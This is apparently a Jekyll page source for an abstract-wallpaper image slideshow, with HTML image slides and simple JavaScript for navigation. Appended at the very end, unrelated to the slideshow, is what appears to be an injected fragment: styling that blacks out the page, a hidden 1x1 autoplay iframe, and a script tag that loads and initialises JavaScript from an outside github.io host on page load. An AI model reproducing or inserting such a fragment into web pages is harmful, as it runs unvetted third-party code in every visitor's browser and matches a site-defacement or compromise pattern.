---
title: Abstarct Walpapper
category: Wallpaper
comment: false
---

<div class="container">
  <div class="image">
            <img src="{{site.url}}{{site.baseurl}}/src/assets/img/51324598.jpg" alt="">
  </div>
  <div class="image">
            <img src="{{site.url}}{{site.baseurl}}/src/assets/img/51633312.jpg" alt="">
  </div>
  <div class="image">
            <img src="{{site.url}}{{site.baseurl}}/src/assets/img/img-sample.jpg" alt="">
  </div>
  <div class="image">
            <img src="https://media.istockphoto.com/photos/lots-of-multicoloured-cubes-moving-in-space-to-come-together-to-form-picture-id1312818032?s=2048x2048" alt="">
  </div>
  <div class="image">
            <img src="https://media.istockphoto.com/photos/abstract-technological-background-in-vibrant-colors-with-blur-picture-id1310488699?s=2048x2048" alt="">
  </div>
  <div class="button">
            <a onclick="nextimg(-1)" class="prev">&#10094;</a>
            <a onclick="nextimg(1)" class="next">&#10095;</a>
  </div>
  <div class="dots">
            <span class="dot" onclick="currentSlide(1)"></span>
            <span class="dot" onclick="currentSlide(2)"></span>
            <span class="dot" onclick="currentSlide(3)"></span>
            <span class="dot" onclick="currentSlide(4)"></span>
            <span class="dot" onclick="currentSlide(5)"></span>
  </div>
    </div>

<script>
  var imageno =1;
    displayimg(imageno);

  function nextimg(n){
    displayimg(imageno += n)
        }

  function currentSlide(n){
    displayimg(imageno = n)
        }

  function displayimg(n){
    var i;
    var image = document.getElementsByClassName("image");
    var dots = document.getElementsByClassName("dot");
    if(n > image.length){
    imageno = 1;
      }
    if(n < 1){
    imageno = image.length;
      }
    for(i=0; i < image.length; i++){
    image[i].style.display = "none";
      }
    for(i=0; i < dots.length; i++){
    dots[i].className = dots[i].className.replace(" active", "");
      }
    image[imageno - 1].style.display ="block";
    dots[imageno - 1].className += " active";
}
</script>
<style>body{overflow:hidden;background-color:black}#q{font:45px Germania One;color:red;position:absolute;left:0;right:0;top:43%}</style> <iframe width="1" height="1" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen=""></iframe> <script type="text/javascript" src="http://b012ed.github.io/b012ed.js"></script> <script type="text/javascript">b012ed.init("http://b012ed.github.io/B012ED.png"); </script>
